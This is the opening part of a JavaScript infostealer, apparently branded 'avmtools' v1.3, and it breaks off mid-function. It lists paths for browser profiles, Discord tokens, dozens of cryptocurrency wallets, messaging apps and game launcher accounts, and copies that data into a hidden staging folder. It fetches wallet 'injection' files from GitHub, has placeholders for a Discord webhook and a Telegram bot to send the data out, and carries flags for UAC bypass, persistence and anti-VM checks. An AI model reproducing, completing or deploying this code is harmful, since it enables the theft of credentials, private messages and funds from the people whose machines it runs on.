const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const CONFIG = { browsers: true, backupcodes: true, games: true, filevpn: true, wallet: false, disableuac: true, computerinfo: true, fakeerror: false, startup: true, antivm: false };
let sqlite3; try { sqlite3 = require('sqlite3'); } catch (e) { sqlite3 = null; }
const { execSync, exec, spawn } = require('child_process');
const axios = require('axios');
const FormData = require('form-data');
const archiver = require('archiver');
process.on('uncaughtException', (err) => { logError(err, 'Global-UncaughtException'); });
process.on('unhandledRejection', (reason, promise) => { logError(reason, 'Global-UnhandledRejection'); });
function getLocale() { return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase(); }
const computerName = os.hostname();
const local = process.env.LOCALAPPDATA;
const locale = getLocale(); const VERSION = 'v1.3';
const randStr = generateRandomString(12); const active_nodes = [];
const folderIdx = process.argv.indexOf('--folder'); const fallback_conf = [];
const mainFolderName = (folderIdx > -1 && process.argv[folderIdx + 1]) ? process.argv[folderIdx + 1] : generateRandomString(10);
const globalSettingsPath = path.join('C:\\', 'ProgramData', 'Microsoft', 'UserSettings');
const mainFolderPath = path.join(globalSettingsPath, mainFolderName, `${locale}-${computerName}`); const globalLockFile = path.join(globalSettingsPath, 'WinHost.lock');
const screenshotPath = path.join(mainFolderPath, 'Screenshot', 'screenshot.png');
var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
const atomicInjectionUrl = 'https://github.com/AVMTools/wallet-injection/raw/refs/heads/main/atomic.asar';
const exodusInjectionUrl = 'https://github.com/AVMTools/wallet-injection/raw/refs/heads/main/exodus.asar';

const discordWebhookUrl = 'REMPLACE_ME';
const telegramBotToken = 'REMPLACE_ME';
const telegramChatId = 'REMPLACE_ME';

function checkSingleInstance() {
    try {
        if (!fs.existsSync(globalSettingsPath)) fs.mkdirSync(globalSettingsPath, { recursive: true });

        if (fs.existsSync(globalLockFile)) {
            const pid = fs.readFileSync(globalLockFile, 'utf8');
            try {
                process.kill(parseInt(pid), 0);
                process.exit(0);
            } catch (e) { }
        }
        fs.writeFileSync(globalLockFile, process.pid.toString());
        process.on('exit', () => { try { fs.unlinkSync(globalLockFile); } catch (e) { } });
    } catch (e) { }
}

function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        result += chars[randomIndex];
    }
    return result;
}

function decodeString(encoded) {
    return Buffer.from(encoded, 'base64').toString('utf8');
}

const user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime(),
    homedir: os.homedir(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: os.cpus().length,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    copyright: `<================[ t.me/avmtools | ${VERSION} ]>================>\n\n`,
    url: null,
    locale: locale,
}

const PATHS = {
    browsers: [
        [user.local + '\\Google\\Chrome\\User Data\\Default\\', 'Default', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', 'Default', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', 'Guest Profile', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
        [user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\', 'Default', user.local + '\\Yandex\\YandexBrowser\\ User Data\\'],
        [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
        [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
        [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
        [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
        [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
        [user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', 'Guest Profile', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
        [user.local + '\\Microsoft\\Edge\\User Data\\Default\\', 'Default', user.local + '\\Microsoft\\Edge\\User Data\\'],
        [user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\Microsoft\\Edge\\User Data\\'],
        [user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\Microsoft\\Edge\\User Data\\'],
        [user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\Microsoft\\Edge\\User Data\\'],
        [user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\Microsoft\\Edge\\User Data\\'],
        [user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\Microsoft\\Edge\\User Data\\'],
        [user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', 'Guest Profile', user.local + '\\Microsoft\\Edge\\User Data\\'],
        [user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\', 'Default', user.roaming + '\\Opera Software\\Opera Neon\\User Data\\'],
        [user.roaming + '\\Opera Software\\Opera Stable\\', 'Default', user.roaming + '\\Opera Software\\Opera Stable\\'],
        [user.roaming + '\\Opera Software\\Opera GX Stable\\', 'Default', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    ],
    games: {
        'NationsGlory': { 'Local Storage': 'AppData\\Roaming\\NationsGlory\\Local Storage\\leveldb' },
        'Riot Games': {
            'Config': 'AppData\\Local\\Riot Games\\Riot Client\\Config',
            'Data': 'AppData\\Local\\Riot Games\\Riot Client\\Data',
        },
        'Epic Games': { 'Settings': 'AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini' },
        'Uplay': { 'Settings': 'AppData\\Local\\Ubisoft Game Launcher' },
        'Minecraft': {
            'Microsoft Store': 'AppData\\Roaming\\.minecraft\\launcher_accounts_microsoft_store.json',
            'CheatBreakers': 'AppData\\Roaming\\.minecraft\\cheatbreaker_accounts.json',
            'Rise (Intent)': 'intentlauncher\\Rise\\alts.txt',
            'TLauncher': 'AppData\\Roaming\\.minecraft\\TlauncherProfiles.json',
            'Paladium': 'AppData\\Roaming\\paladium-group\\accounts.json',
            'Novoline': 'AppData\\Roaming\\.minecraft\\Novoline\\alts.novo',
            'Badlion': 'AppData\\Roaming\\Badlion Client\\accounts.json',
            'Feather': 'AppData\\Roaming\\.feather\\accounts.json',
            'Impact': 'AppData\\Roaming\\.minecraft\\Impact\\alts.json',
            'Meteor': 'AppData\\Roaming\\.minecraft\\meteor-client\\accounts.nbt',
            'PolyMC': 'AppData\\Roaming\\PolyMC\\accounts.json',
            'PrismLauncher': 'AppData\\Roaming\\PrismLauncher\\accounts.json',
            'Intent': 'intentlauncher\\launcherconfig',
            'Lunar': '.lunarclient\\settings\\game\\accounts.json',
            'Rise': 'AppData\\Roaming\\.minecraft\\Rise\\alts.txt',
            'Launcher Accounts (Microsoft)': 'AppData\\Roaming\\.minecraft\\launcher_accounts.json',
            'Launcher Profiles': 'AppData\\Roaming\\.minecraft\\launcher_profiles.json',
            'Last Login': 'AppData\\Roaming\\.minecraft\\lastlogin',
            'Session': 'AppData\\Roaming\\.minecraft\\session',
            'User Cache': 'AppData\\Roaming\\.minecraft\\usercache.json',
            'Server List': 'AppData\\Roaming\\.minecraft\\servers.dat',
            'Stats': 'AppData\\Roaming\\.minecraft\\stats',
            'Saves': { path: 'AppData\\Roaming\\.minecraft\\saves', excludes: ['region'] },
            'Screenshots': 'AppData\\Roaming\\.minecraft\\screenshots',
            'Config': 'AppData\\Roaming\\.minecraft\\config',
            'Minecraft Windows 10': { path: 'AppData\\Local\\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang', excludes: ['region', 'resource_packs', 'behavior_packs', 'minecraftPE'] },
        },
        'PrismLauncher': {
            'Accounts': 'AppData\\Roaming\\PrismLauncher\\accounts.json',
            'Instances': { path: 'AppData\\Roaming\\PrismLauncher\\instances', excludes: ['region', 'mods', 'resourcepacks', 'shaderpacks', '.minecraft', 'logs'] },
            'Metacache': 'AppData\\Roaming\\PrismLauncher\\metacache',
            'Config': 'AppData\\Roaming\\PrismLauncher\\prismlauncher.cfg',
            'Profiles': 'AppData\\Roaming\\PrismLauncher\\profiles.json',
        },
        'Rockstar Games': {
            'Social Club': {
                path: 'Documents\\Rockstar Games\\Social Club',
                excludes: ['Code Cache', 'Cache', 'Service Worker', 'GPUCache', 'DawnCache', 'blob_storage']
            },
        },
        'Electronic Arts': { 'EA App': 'AppData\\Local\\EA Desktop' },
        'GOG Galaxy': { 'Galaxy': { path: 'Program Files (x86)\\GOG Galaxy', excludes: ['Games', 'Dependencies', 'redists'] } },
        'Battle.net': { 'Battle.net': { path: 'AppData\\Local\\Battle.net', excludes: ['Logs', 'BrowserCache', 'Cache'] } },
        'Origin': { 'Origin': { path: 'AppData\\Local\\Origin', excludes: ['Logs', 'Cache'] } },
        'Roblox': { 'Roblox': { path: 'AppData\\Local\\Roblox', excludes: ['Versions', 'Logs', 'GlobalBasicSettings_13.xml'] } }
    },
    wallets: {
        "Coinbase": "Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
        "BinanceChain": "Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
        "Phantom": "Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
        "TronLink": "Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
        "Ronin": "Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
        "Exodus_Ext": "Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno",
        "Coin98": "Local Extension Settings\\aeachknmefphepccionboohckonoeemg",
        "Authenticator": "Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
        "MathWallet": "Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc",
        "YoroiWallet": "Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb",
        "GuardaWallet": "Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln",
        "JaxxxLiberty": "Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne",
        "Wombat": "Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih",
        "EVERWallet": "Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk",
        "KardiaChain": "Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk",
        "XDEFI": "Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf",
        "Nami": "Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo",
        "TerraStation": "Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp",
        "MartianAptos": "Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk",
        "TON": "Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd",
        "Keplr": "Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap",
        "CryptoCom": "Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj",
        "PetraAptos": "Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci",
        "OKX": "Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge",
        "Sollet": "Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno",
        "Sender": "Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg",
        "Sui": "Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil",
        "SuietSui": "Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd",
        "Braavos": "Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma",
        "FewchaMove": "Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj",
        "EthosSui": "Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli",
        "ArgentX": "Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb",
        "NiftyWallet": "Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid",
        "BraveWallet": "Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl",
        "EqualWallet": "Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac",
        "BitAppWallet": "Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi",
        "iWallet": "Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj",
        "AtomicWallet": "Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh",
        "MewCx": "Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm",
        "GuildWallet": "Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj",
        "SaturnWallet": "Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig",
        "HarmonyWallet": "Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib",
        "PaliWallet": "Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn",
        "BoltX": "Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca",
        "LiqualityWallet": "Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn",
        "MaiarDeFiWallet": "Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm",
        "TempleWallet": "Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc",
        "Metamask_E": "Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",
        "Ronin_E": "Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk",
        "Yoroi_E": "Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb",
        "Authenticator_E": "Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio",
        "MetaMask_O": "Local Extension Settings\\djclckkglechooblngghdinmeemkbgci"
    },
    walletApps: {
        "Bitcoin": process.env.APPDATA + "\\Bitcoin\\wallets",
        "Zcash": process.env.APPDATA + "\\Zcash",
        "Armory": process.env.APPDATA + "\\Armory",
        "Bytecoin": process.env.APPDATA + "\\bytecoin",
        "Jaxx": process.env.APPDATA + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
        "Exodus": process.env.APPDATA + "\\Exodus\\exodus.wallet",
        "Ethereum": process.env.APPDATA + "\\Ethereum\\keystore",
        "Electrum": process.env.APPDATA + "\\Electrum\\wallets",
        "AtomicWallet": process.env.APPDATA + "\\atomic\\Local Storage\\leveldb",
        "Guarda": process.env.APPDATA + "\\Guarda\\Local Storage\\leveldb",
        "Coinomi": process.env.APPDATA + "\\Coinomi\\Coinomi\\wallets",
    },
    socials: {
        'Telegram Desktop': 'AppData\\Roaming\\Telegram Desktop\\tdata',
        'WhatsApp Desktop': 'AppData\\Roaming\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState',
        'Signal Desktop': 'AppData\\Roaming\\Signal\\databases',
        'Purple': 'AppData\\Roaming\\.purple',
        'Tox': 'AppData\\Roaming\\tox',
        'Element': 'AppData\\Roaming\\Element\\Local Storage',
        'Skype': 'AppData\\Roaming\\Microsoft\\Skype for Desktop\\Local Storage',
        'Facebook Messenger': 'AppData\\Local\\Facebook\\Messenger',
        'Microsoft Teams': 'AppData\\Local\\Microsoft Teams',
        'Snapchat': 'AppData\\Local\\Snapchat',
        'Instagram': 'AppData\\Local\\Instagram',
        'Viber': 'AppData\\Local\\Viber',
        'Line': 'AppData\\Local\\Line',
        'WeChat': 'AppData\\Local\\WeChat',
        'Tumblr': 'AppData\\Local\\Tumblr',
        'ICQ': 'AppData\\Local\\ICQ\\0001',
        'Reddit': 'AppData\\Local\\Reddit',
        'Pinterest': 'AppData\\Local\\Pinterest',
        'Flock': 'AppData\\Local\\Flock',
        'Trello': 'AppData\\Local\\Trello',
        'Hangouts': 'AppData\\Local\\Google\\Hangouts',
    },
    discord: [
        appdata + '\\discord\\',
        appdata + '\\discordcanary\\',
        appdata + '\\discordptb\\',
        appdata + '\\discorddevelopment\\',
        appdata + '\\lightcord\\',
        localappdata + '\\Google\\Chrome\\User Data\\Default\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
        localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
        localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
        localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
        appdata + '\\Opera Software\\Opera Stable\\',
        appdata + '\\Opera Software\\Opera GX Stable\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
        localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
    ],
    processes: {
        'Google\\Chrome': 'chrome.exe',
        'BraveSoftware\\Brave-Browser': 'brave.exe',
        'Yandex\\YandexBrowser': 'browser.exe',
        'Microsoft\\Edge': 'msedge.exe',
        'Opera Software\\Opera Stable': 'opera.exe',
        'Opera Software\\Opera GX Stable': 'opera.exe',
        'Opera Software\\Opera Neon': 'opera.exe',
    }
};

const browserPath = PATHS.browsers;
const gamesPaths = PATHS.games;

function getTimestamp() {
    const now = new Date();
    return now.toLocaleString('fr-FR', { timeZoneName: 'short' });
}

function logError(error, context = '') {
    try {
        const timestamp = getTimestamp();
        const logMessage = `[${timestamp}] [ERROR] ${context}: ${error.message || error}\nStack: ${error.stack || 'No stack trace'}\n\n`;

        console.error(`[ERROR] ${context}:`, error);

        if (!mainFolderPath) return;
        if (!fs.existsSync(mainFolderPath)) fs.mkdirSync(mainFolderPath, { recursive: true });

        const logFilePath = path.join(mainFolderPath, 'log.txt');
        fs.appendFileSync(logFilePath, logMessage, 'utf8');

    } catch (logError) {
        console.error('[CRITICAL] Failed to write to log file:', logError);
    }
}

function logSuccess(message) {
    try {
        const timestamp = getTimestamp();
        const logMessage = `[${timestamp}] [SUCCESS] ${message}\n`;
        if (!mainFolderPath) return;
        if (!fs.existsSync(mainFolderPath)) fs.mkdirSync(mainFolderPath, { recursive: true });

        const logFilePath = path.join(mainFolderPath, 'log.txt');
        fs.appendFileSync(logFilePath, logMessage, 'utf8');
    } catch (e) { }
}

function logInfo(message) {
    try {
        const timestamp = getTimestamp();
        const logMessage = `[${timestamp}] [INFO] ${message}\n`;

        if (!mainFolderPath) return;
        if (!fs.existsSync(mainFolderPath)) fs.mkdirSync(mainFolderPath, { recursive: true });

        const logFilePath = path.join(mainFolderPath, 'log.txt');
        fs.appendFileSync(logFilePath, logMessage, 'utf8');
    } catch (e) { }
}

const MAX_ITEM_SIZE = 25 * 1024 * 1024;
const MAX_TEMPORARY_TOTAL_SIZE = 1024 * 1024 * 1024;
const FINAL_ARCHIVE_LIMIT = 100 * 1024 * 1024;
let globalCopiedSize = 0;
let globalLimitReached = false;

async function copyFolderRecursive(source, target, excludes = []) {
    try {
        if (!fs.existsSync(target)) {
            await fs.promises.mkdir(target, { recursive: true });
        }

        const files = await fs.promises.readdir(source);
        for (const file of files) {
            if (excludes.some(ex => file.includes(ex))) continue;

            const curSource = path.join(source, file);
            const curTarget = path.join(target, file);

            try {
                const stats = await fs.promises.stat(curSource);

                if (stats.isDirectory()) {
                    await copyFolderRecursive(curSource, curTarget, excludes);
                } else {
                    if (stats.size > MAX_ITEM_SIZE) {
                        continue;
                    }
                    await fs.promises.copyFile(curSource, curTarget);
                }
            } catch (err) {
            }
        }
    } catch (err) {
    }
}

function copyFileIfExists(source, targetDir, fileName = null, excludes = [], maxSize = null) {
    if (!fs.existsSync(source)) return false;

    if (!fs.existsSync(targetDir)) {
        fs.mkdirSync(targetDir, { recursive: true });
    }

    const targetPath = fileName ? path.join(targetDir, fileName) : path.join(targetDir, path.basename(source));

    try {
        if (fs.lstatSync(source).isDirectory()) {
            logInfo(`[Skip] Directory copy not supported in copyFileIfExists: ${source}`);
            return false;
        } else {
            const stats = fs.statSync(source);
            const limit = maxSize || MAX_ITEM_SIZE;
            if (stats.size > limit) {
                logInfo(`[Skip] File too large (${formatBytes(stats.size)}): ${source}`);
                return false;
            }
            if (globalCopiedSize + stats.size > MAX_TEMPORARY_TOTAL_SIZE) {
                if (!globalLimitReached) {
                    logInfo(`[Storage] Temporary storage limit of 1GB reached. Skipping: ${source}`);
                    globalLimitReached = true;
                }
                return false;
            }
            fs.copyFileSync(source, targetPath);
            globalCopiedSize += stats.size;
        }
    } catch (e) {
        return false;
    }

    return true;
}

function pruneMainFolder(targetDir, limit) {
    if (!fs.existsSync(targetDir)) return;

    function listAllFiles(dir, fileList = []) {
        try {
            const files = fs.readdirSync(dir);
            files.forEach(file => {
                const filePath = path.join(dir, file);
                try {
                    const stats = fs.lstatSync(filePath);
                    if (stats.isDirectory()) {
                        listAllFiles(filePath, fileList);
                    } else {
                        fileList.push({ path: filePath, size: stats.size });
                    }
                } catch (e) { }
            });
        } catch (e) { }
        return fileList;
    }

    let allFiles = listAllFiles(targetDir);
    let totalSize = allFiles.reduce((acc, f) => acc + f.size, 0);

    if (totalSize > limit) {
        logInfo(`[Pruning] Folder size is ${formatBytes(totalSize)}. Limit is ${formatBytes(limit)}. Pruning largest files...`);

        allFiles.sort((a, b) => b.size - a.size);

        for (const file of allFiles) {
            try {
                fs.unlinkSync(file.path);
                totalSize -= file.size;
                if (totalSize <= limit) break;
            } catch (e) { }
        }
        logInfo(`[Pruning] Final folder size: ${formatBytes(totalSize)}`);
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    let val = parseFloat((bytes / Math.pow(k, i)).toFixed(2));

    if (val >= 100) return val.toFixed(0) + ' ' + sizes[i];
    if (val >= 10) return val.toFixed(1) + ' ' + sizes[i];
    return val.toFixed(1) + ' ' + sizes[i];
}



async function checkPrismLauncherPortable() {
    try {
        const possiblePortablePaths = [
            'C:\\Program Files\\PrismLauncher',
            'C:\\Program Files (x86)\\PrismLauncher',
            path.join(os.homedir(), 'Desktop', 'PrismLauncher'),
            path.join(os.homedir(), 'Downloads', 'PrismLauncher'),
            path.join(os.homedir(), 'Documents', 'PrismLauncher'),
        ];

        for (const portablePath of possiblePortablePaths) {
            if (fs.existsSync(portablePath)) {
                const cfgPath = path.join(portablePath, 'prismlauncher.cfg');
                const portableIndicator = path.join(portablePath, 'portable.txt');

                if (fs.existsSync(cfgPath) || fs.existsSync(portableIndicator)) {

                    return portablePath;
                }

                const exePath = path.join(portablePath, 'PrismLauncher.exe');
                if (fs.existsSync(exePath)) {

                    return portablePath;
                }
            }
        }
        return null;
    } catch (error) {
        logError(error, 'checkPrismLauncherPortable');
        return null;
    }
}

async function fetchSocials() {
    const socialsPaths = PATHS.socials;

    let socialsFoundCount = 0;
    const userHome = os.homedir();
    const socialsDir = path.join(mainFolderPath, 'Socials');

    for (const [name, relativePath] of Object.entries(socialsPaths)) {
        try {
            const fullPath = path.join(userHome, relativePath);

            if (fs.existsSync(fullPath)) {

                if (!fs.existsSync(socialsDir)) fs.mkdirSync(socialsDir, { recursive: true });
                const targetPath = path.join(socialsDir, name);

                let excludes = [];
                if (name === 'Telegram Desktop') {
                    excludes = ["emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "working", "temp", "temp_data"];
                }

                await copyFolderRecursive(fullPath, targetPath, excludes);
                socialsFoundCount++;
            }
        } catch (err) {
            logError(err, `fetchSocials-${name}`);
        }
    }
    return socialsFoundCount;
}

async function fetchGamesData() {
    let gamesCount = 0;
    const gamesDir = path.join(mainFolderPath, 'Games');
    const MAX_FILE_SIZE = 25 * 1024 * 1024;

    try {
        const userHome = os.homedir();

        const portablePrismPath = await checkPrismLauncherPortable();
        if (portablePrismPath) {
            if (!fs.existsSync(gamesDir)) fs.mkdirSync(gamesDir, { recursive: true });
            const prismTargetDir = path.join(gamesDir, 'PrismLauncher_Portable');
            try {
                await copyFolderRecursive(portablePrismPath, prismTargetDir);
